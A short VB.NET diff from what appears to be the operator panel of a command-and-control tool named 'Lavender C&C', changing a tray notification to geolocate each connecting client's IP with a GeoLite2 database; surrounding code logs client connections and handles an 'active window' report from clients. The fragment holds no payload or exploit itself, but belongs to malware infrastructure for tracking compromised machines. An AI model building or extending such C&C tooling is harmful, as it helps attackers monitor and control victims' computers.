@@ -344,9 +344,13 @@ Public Class Main
 
                         ''show tooltip
                         TrayIcon.BalloonTipIcon = ToolTipIcon.Info
-                        TrayIcon.BalloonTipTitle = "Lavender C&C"
-                        TrayIcon.BalloonTipText = "Client connected: [ ID : " & A(1) & " IP : " & S.IP(sock) & " Country : " & A(3) & " ]"
-                        TrayIcon.ShowBalloonTip(1)
+                    TrayIcon.BalloonTipTitle = "Lavender C&C"
+                    Using rdr As New DatabaseReader("GeoLite2-Country.mmdb")
+                        TrayIcon.BalloonTipText = "Client connected: [ ID : " & A(1) & " IP : " & S.IP(sock) & " Country : " & rdr.Country(S.IP(sock)).Country.Name & " ]"
+                        ''rdr.
+                    End Using
+
+                    TrayIcon.ShowBalloonTip(1)
 
                     WriteToLog("Client """ & A(1) & """ connected")
                 Case n.activewindow ''active window
